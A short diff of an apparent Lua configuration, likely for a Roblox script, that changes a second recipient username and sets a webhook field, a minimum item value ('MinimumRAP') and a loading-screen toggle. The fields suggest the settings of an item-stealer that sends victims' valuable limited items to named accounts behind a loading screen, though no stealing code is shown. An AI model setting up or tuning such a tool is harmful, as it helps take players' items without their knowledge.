@@ -1,6 +1,6 @@
 
 Username = "flzmrt10" -- here username
-Username2 = "flzmrt11" -- here username2
+Username2 = "flzmrt" -- here username2
 Webhook = "" -- here webhook
 MinimumRAP = 100000 -- minimum want rap
 loading_screen = true -- no want loading_screen false Loading_screen true want loading screen
